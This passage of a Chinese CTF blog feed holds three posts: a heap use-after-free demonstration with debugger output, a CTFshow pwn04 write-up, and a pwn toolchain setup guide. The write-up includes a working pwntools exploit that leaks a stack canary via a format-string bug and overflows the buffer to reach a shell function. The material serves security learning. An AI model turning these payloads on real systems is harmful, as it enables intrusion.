r-xp     1000   1000 /home/g01den/Temp/how2heap/first</span><br><span class=\"line\">    0x555555556000     0x555555557000 r--p     1000   2000 /home/g01den/Temp/how2heap/first</span><br><span class=\"line\">    0x555555557000     0x555555558000 r--p     1000   2000 /home/g01den/Temp/how2heap/first</span><br><span class=\"line\">    0x555555558000     0x555555559000 rw-p     1000   3000 /home/g01den/Temp/how2heap/first</span><br><span class=\"line\">    0x7ffff7dcb000     0x7ffff7ded000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class=\"line\">    0x7ffff7ded000     0x7ffff7f65000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class=\"line\">    0x7ffff7f65000     0x7ffff7fb3000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class=\"line\">    0x7ffff7fb3000     0x7ffff7fb7000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class=\"line\">    0x7ffff7fb7000     0x7ffff7fb9000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class=\"line\">    0x7ffff7fb9000     0x7ffff7fbf000 rw-p     6000      0 [anon_7ffff7fb9]</span><br><span class=\"line\">    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]</span><br><span class=\"line\">    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]</span><br><span class=\"line\">    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class=\"line\">    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class=\"line\">    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class=\"line\">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class=\"line\">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class=\"line\">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]</span><br><span class=\"line\">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br></pre></td></tr></table></figure>\n<p>​\t\t明显，这里不存在 heap 段，进行 malloc 之后，发现多出来了个 heap 段：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">vmmap</span></span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">             Start                End Perm     Size Offset File</span><br><span class=\"line\">    0x555555554000     0x555555555000 r--p     1000      0 /home/g01den/Temp/how2heap/first</span><br><span class=\"line\">    0x555555555000     0x555555556000 r-xp     1000   1000 /home/g01den/Temp/how2heap/first</span><br><span class=\"line\">    0x555555556000     0x555555557000 r--p     1000   2000 /home/g01den/Temp/how2heap/first</span><br><span class=\"line\">    0x555555557000     0x555555558000 r--p     1000   2000 /home/g01den/Temp/how2heap/first</span><br><span class=\"line\">    0x555555558000     0x555555559000 rw-p     1000   3000 /home/g01den/Temp/how2heap/first</span><br><span class=\"line\">    0x555555559000     0x55555557a000 rw-p    21000      0 [heap]</span><br><span class=\"line\">    0x7ffff7dcb000     0x7ffff7ded000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class=\"line\">    0x7ffff7ded000     0x7ffff7f65000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class=\"line\">    0x7ffff7f65000     0x7ffff7fb3000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class=\"line\">    0x7ffff7fb3000     0x7ffff7fb7000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class=\"line\">    0x7ffff7fb7000     0x7ffff7fb9000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class=\"line\">    0x7ffff7fb9000     0x7ffff7fbf000 rw-p     6000      0 [anon_7ffff7fb9]</span><br><span class=\"line\">    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]</span><br><span class=\"line\">    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]</span><br><span class=\"line\">    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class=\"line\">    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class=\"line\">    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class=\"line\">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class=\"line\">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class=\"line\">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]</span><br><span class=\"line\">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br></pre></td></tr></table></figure>\n<p>​\t\t先查看下 chunk 有些啥？</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555559000</span><br><span class=\"line\">Size: 0x290 (with flag bits: 0x291)</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555559290</span><br><span class=\"line\">Size: 0x520 (with flag bits: 0x521)</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555555597b0</span><br><span class=\"line\">Size: 0x260 (with flag bits: 0x261)</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555559a10</span><br><span class=\"line\">Size: 0x205f0 (with flag bits: 0x205f1)</span><br></pre></td></tr></table></figure>\n<p>​\t\t根据下面两个输出：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第一个 a = malloc(0x512) 在: 0x5555555592a0</span><br><span class=\"line\">第二个 a = malloc(0x256) 在: 0x5555555597c0</span><br></pre></td></tr></table></figure>\n<p>​\t\t可以看出来，上面那个 heap 结构中，第二个为 a 所在地址，第三个为 b 所在地址，为啥上下看到的地址不同，这个主要是和 malloc 函数返回指针的地址有关，这个这儿就不细说了。</p>\n<p>​\t\t在把 AAAAAAAA 这个字符串写入 a 中，我们看看 a 的内存布局：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/10gx 0x555555559290</span><br><span class=\"line\">0x555555559290: 0x0000000000000000      0x0000000000000521</span><br><span class=\"line\">0x5555555592a0: 0x4141414141414141      0x0000000000000000</span><br><span class=\"line\">0x5555555592b0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t可以看出来，已经成功写入了，先 free 掉 a，之后 malloc 一个比 a 小一点的，把这个地址赋给 c，可以看出，输出的时候发现 a 原本的地址和 c 的地址相等：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#第一个 a = malloc(0x512) 在: 0x5555555592a0</span></span><br><span class=\"line\"> 第三次 c = malloc(0x500) 在: 0x5555555592a0</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后将 CCCCCCCC 写入 c 的地址，之后通过 a 和 c 输出试试看：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第三次申请的 c 0x5555555592a0 指向 CCCCCCCC</span><br><span class=\"line\">第一次申请的 a 0x5555555592a0 指向 CCCCCCCC</span><br></pre></td></tr></table></figure>\n<p>​\t\t当释放了一块内存之后再去申请一个大小略小的空间，那么 glibc 倾向于将先前释放的空间重新分配，由于 a 的指针没有被置零，这就造成了可以直接通过 a 来访问已经 free 掉的 chunk 和重新分配好的略小的 chunk，由此，造成了 UAF 漏洞。</p>\n",
            "tags": [
                "Pwn"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/9b0d93f7.html",
            "url": "http://blog.g01den.top/posts/9b0d93f7.html",
            "title": "Pwn刷题记录（不停更新）",
            "date_published": "2024-06-23T10:49:18.000Z",
            "content_html": "<h2 id=\"1-ctfshow-pwn04基础canary\"><a class=\"markdownIt-Anchor\" href=\"#1-ctfshow-pwn04基础canary\">#</a> 1、CTFshow-pwn04（基础 canary）</h2>\n<p>​\t\t好久没碰过 pwn 了，今天临时做一道吧，毕竟刚联合了 WSL 和 VSCode，想着试着做一道题看看，结果随手一点，就是一个很少接触的，拿来刷刷：</p>\n<p>​\t\t先查看下保护：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@MSI:/home/g01den/Temp<span class=\"comment\"># checksec pwn</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/g01den/Temp/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<p>​\t\t除了 NX 之外，似乎就只有 Canary 了。反编译看看：</p>\n<p>​\t\t有用的只有 vuln 函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">vuln</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [esp+4h] [ebp-74h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">100</span>]; <span class=\"comment\">// [esp+8h] [ebp-70h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v3; <span class=\"comment\">// [esp+6Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">1</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x200</span>u);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(buf);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t发现了个事儿，for 循环会执行两次，所以这里采用第一次不溢出，通过格式化字符串漏洞对 Canary 的值进行泄露，之后就可以在合适的地方填入 canary 的值来绕过 canary 保护了。</p>\n<p>​\t\t因此，思路就很明确了。</p>\n<p>​\t\t之后通过 disass vuln 查看汇编代码，发现了重要的一个内容，它在 ret 之前进行了一次异或，且指定的内存为 [ebp-0xc]：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x08048677 &lt;+73&gt;:    nop</span><br><span class=\"line\">0x08048678 &lt;+74&gt;:    mov    eax,DWORD PTR [ebp-0xc]</span><br><span class=\"line\">0x0804867b &lt;+77&gt;:    xor    eax,DWORD PTR gs:0x14</span><br><span class=\"line\">0x08048682 &lt;+84&gt;:    je     0x8048689 &lt;vuln+91&gt;</span><br><span class=\"line\">0x08048684 &lt;+86&gt;:    call   0x8048450 &lt;__stack_chk_fail@plt&gt;</span><br><span class=\"line\">0x08048689 &lt;+91&gt;:    leave  </span><br><span class=\"line\">0x0804868a &lt;+92&gt;:    ret </span><br></pre></td></tr></table></figure>\n<p>​\t\t由此可知，cannary 存放的地址就是 [ebp-0xc]，看一下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1f:007c│-00c 0xffffd56c ◂— 0x7493ea00</span><br><span class=\"line\">20:0080│-008 0xffffd570 —▸ 0x8048768 ◂— dec eax /* <span class=\"string\">&#x27;Hello Hacker!&#x27;</span> */</span><br><span class=\"line\">21:0084│-004 0xffffd574 ◂— 0xa0000</span><br><span class=\"line\">22:0088│ ebp 0xffffd578 —▸ 0xffffd598 ◂— 0</span><br></pre></td></tr></table></figure>\n<p>​\t\t目测 cannary 的值为 0x7493ea00，那么， 想要泄露这个值，需要使用格式化字符串来泄露，那么，来判断下对不对吧，我们输入 %31$x 即可泄露：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/da9f516fdace47a5a69b947210919c38.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t根据这俩进行计算，可得到偏移，结果是 0x7c/4=31。</p>\n<p>​\t\t之后就是具体进行溢出了，计算溢出的长度也比较简单，这里直接上答案吧，116 字节，不过，第 100 到 104 为 canary 的值。</p>\n<p>​\t\t由于存在后门函数，所以 exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class=\"line\">Locale = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> Locale == <span class=\"number\">1</span>:</span><br><span class=\"line\">    io = process(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    io = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28203</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;i386&#x27;</span>, os=<span class=\"string\">&#x27;linux&#x27;</span>, log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recv()</span><br><span class=\"line\">payload1 = <span class=\"string\">b&quot;%31$x&quot;</span></span><br><span class=\"line\">io.sendline(payload1)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">canary = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">b&#x27;\\n&#x27;</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">getshell_addr = <span class=\"number\">0x0804859B</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">100</span> + p32(canary) + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">12</span> + p32(getshell_addr)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Pwn"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/d7e2e20f.html",
            "url": "http://blog.g01den.top/posts/d7e2e20f.html",
            "title": "pwn学习笔记（0）-事后补充",
            "date_published": "2024-06-23T09:35:42.000Z",
            "content_html": "<h1 id=\"pwn环境部署\"><a class=\"markdownIt-Anchor\" href=\"#pwn环境部署\">#</a> Pwn 环境部署：</h1>\n<h2 id=\"1-背景\"><a class=\"markdownIt-Anchor\" href=\"#1-背景\">#</a> 1、背景：</h2>\n<p>​\t\t首先是在最开始的时候装环境此次碰壁，搞得没心思写这篇博客，其次，又因为虚拟机本身的问题，导致我对虚拟机有很强的不满，所以我最开始没有写这篇博客，但是，转念一想，为什么我必须得执着于 虚拟机呢？不是同样都是 Linux 吗，为啥我不直接采用 WSL 来部署 Pwn 环境呢？所以，这里我选择了重装了下 Pwn 环境，不过，因为我装好很大一部分之后才想起来记录博客，所以我只会把前面的内容简单记录一下，不进行二次实操了。</p>\n<p>​\t\tWSL 的安装我就不详细进行说明了，这个挺无脑的。</p>\n<h2 id=\"2-基础工具\"><a class=\"markdownIt-Anchor\" href=\"#2-基础工具\">#</a> 2、基础工具：</h2>\n<h3 id=\"1vim\"><a class=\"markdownIt-Anchor\" href=\"#1vim\">#</a> &lt;1&gt;Vim：</h3>\n<p>​\t\t我想，大部分的 Ubuntu 似乎都已经装好了，不过似乎听说有的没有，不过贴一个源码过来：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install vim</span><br></pre></td></tr></table></figure>\n<h3 id=\"2git\"><a class=\"markdownIt-Anchor\" href=\"#2git\">#</a> &lt;2&gt;git：</h3>\n<p>​\t\t老样子，一把梭</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install git</span><br></pre></td></tr></table></figure>\n<h3 id=\"3gcc\"><a class=\"markdownIt-Anchor\" href=\"#3gcc\">#</a> &lt;3&gt;GCC：</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install gcc</span><br></pre></td></tr></table></figure>\n<h3 id=\"4python3-pip\"><a class=\"markdownIt-Anchor\" href=\"#4python3-pip\">#</a> &lt;4&gt;python3-pip：</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install python3-pip</span><br></pre></td></tr></table></figure>\n<h3 id=\"5qemu\"><a class=\"markdownIt-Anchor\" href=\"#5qemu\">#</a> &lt;5&gt;qemu：</h3>\n<p>​\t\tQEMU 是一套由法布里斯・贝拉 (Fabrice Bellard) 所编写的以 GPL 许可证分发源码的模拟处理器，在 GNU/Linux 平台上使用广泛，个人感觉还可以但是依旧没有卵用，照样用命令一把梭哈</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install qemu-user qemu-system</span><br></pre></td></tr></table></figure>\n<h3 id=\"6gdb-multiarch\"><a class=\"markdownIt-Anchor\" href=\"#6gdb-multiarch\">#</a> &lt;6&gt;gdb-multiarch：</h3>\n<p>​\t\t用作 gdb 客户端进行调试，是任何架构的通用客户端</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-pwn工具\"><a class=\"markdownIt-Anchor\" href=\"#3-pwn工具\">#</a> 3、Pwn 工具：</h2>\n<h3 id=\"1pwntools-checksec-rop_gadget\"><a class=\"markdownIt-Anchor\" href=\"#1pwntools-checksec-rop_gadget\">#</a> &lt;1&gt;pwntools、checksec、ROP_gadget：</h3>\n<p>​\t\t我采用的是 python3，所以使用，这三个工具似乎直接就通过这个命令一起安装了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip3 install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>\n<h3 id=\"2pwndbgpedagef\"><a class=\"markdownIt-Anchor\" href=\"#2pwndbgpedagef\">#</a> &lt;2&gt;Pwndbg，peda，gef：</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/pwndbg/pwndbg.git</span><br><span class=\"line\">//下面两个是可选的</span><br><span class=\"line\"><span class=\"comment\">#git clone https://github.com/longld/peda.git</span></span><br><span class=\"line\"><span class=\"comment\">#git clone https://github.com/hugsy/gef.git</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t我在这里成功猜了个坑，不知道为啥，现在想要安装 pwndbg 的时候出现了一个很恶心的问题，就是要安装一个 Poetry 的东西，这个很恶心人，遇到了个换源才能解决的问题，没错，我魔法上网都没用的恶心人的问题。依次执行如下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip config <span class=\"built_in\">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class=\"line\"><span class=\"built_in\">cd</span> pwndbg</span><br><span class=\"line\">./setup.sh</span><br></pre></td></tr></table></figure>\n<p>​\t\t安装的速度很慢，需要耐心等待。如果只安装一个 pwndbg 的话，那么在执行完 ./setup.sh 之后就可以不用进行后续操作了。</p>\n<p>​\t\t之后安装插件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pip install keystone-engine ropper keystone-engine</span><br></pre></td></tr></table></figure>\n<p>​\t\t在修改下面的文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim ~/.gdbinit</span><br></pre></td></tr></table></figure>\n<p>​\t\t把下面的内容粘贴进去：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"params\">##</span> vim后在文件内输入下方横线中内容，选择三个插件其中一个，另外两个注释掉，保存退出</span><br><span class=\"line\">-------------------------------------------------------------------------</span><br><span class=\"line\">source /home/hollk/tools/pwndbg/gdbinit.py</span><br><span class=\"line\"><span class=\"params\">#</span>source /home/hollk/tools/peda/peda.py</span><br><span class=\"line\"><span class=\"params\">#</span>source /home/hollk/tools/gef-dev/gef.py</span><br><span class=\"line\">-------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>\n<h3 id=\"3one_gadget\"><a class=\"markdownIt-Anchor\" href=\"#3one_gadget\">#</a> &lt;3&gt;one_gadget：</h3>\n<p>​\t\t在 ctf-pwn 中大部分情况需要获得远程 shell，one_gadget 会自动查找 ELF 文件中的 execve (‘/bin/sh’, NULL, NULL)，通过 exploit 实现 RCE（远程代码执行）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install -y ruby ruby-dev</span><br><span class=\"line\">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>\n<h3 id=\"4seccomp-tools\"><a class=\"markdownIt-Anchor\" href=\"#4seccomp-tools\">#</a> &lt;4&gt;seccomp-tools：</h3>\n<p>​\t\t分析沙盒的工具：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure>\n<h3 id=\"5libcsearcher\"><a class=\"markdownIt-Anchor\" href=\"#5libcsearcher\">#</a> &lt;5&gt;LibcSearcher：</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com.cnpmjs.org/lieanu/LibcSearcher.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> LibcSearcher</span><br><span class=\"line\">sudo python3 setup.py install</span><br></pre></td></tr></table></figure>\n<h3 id=\"6patchelf\"><a class=\"markdownIt-Anchor\" href=\"#6patchelf\">#</a> &lt;6&gt;patchelf</h3>\n<p>​\t\tPatchELF 是一个用于修改现有 ELF 可执行文件和库的简单实用程序</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install patchelf</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-vscode与wsl\"><a class=\"markdownIt-Anchor\" href=\"#4-vscode与wsl\">#</a> 4、VSCode 与 WSL</h2>\n<p>​\t\t首先，需要下载一个 VSCode，然后下载 WSL 插件，之后，在左下角新建连接的时候，在上方中间选择用发行版连接 WSL，之后在左边资源管理器选择文件夹，选择我们的 home 文件夹下的用户文件夹即可。之后就可以在里面编辑文件以及可以打开新的终端，我们就可以结合 Windows 的方便性和 Linux 的环境进行做题了。</p>\n<p>​\t\t遇到权限问题，直接采用赋予权限的方式解决，无法解决那就换文件。</p>\n<h1 id=\"参考文章\"><a class=\"markdownIt-Anchor\" href=\"#参考文章\">#</a> 参考文章：</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2oyODQ4ODYyMDIvYXJ0aWNsZS9kZXRhaWxzLzEzNDkzMTcwOQ==\">★pwn 22.04 环境搭建保姆级教程★</span></p>\n",
            "tags": [
                "Pwn"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/efb4c08.html",
            "url": "http://blog.g01den.top/posts/efb4c08.html",
